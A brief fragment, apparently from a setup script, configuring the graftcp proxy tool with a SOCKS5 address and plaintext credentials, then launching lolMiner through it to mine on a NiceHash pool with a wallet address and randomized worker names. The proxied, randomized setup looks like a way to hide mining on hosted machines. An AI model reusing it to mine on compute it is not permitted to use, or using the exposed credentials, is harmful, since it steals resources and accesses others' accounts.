...
listen = :2233
loglevel = 1
socks5 =  203.176.134.228:4153 
socks5_username = weiufnyo
socks5_password = bvolvuyg3g5z
END
...
./graftcp/graftcp ./lolMiner --algo ETHASH --pool stratum+tcp://daggerhashimoto.hk.nicehash.com:3353 --user 343QVQVLGBkJdmb2KPhzR6b3JyUFsXQb7G.$(echo $(shuf -i 1-999 -n 1)-NTOT) --ethstratum ETHPROXY
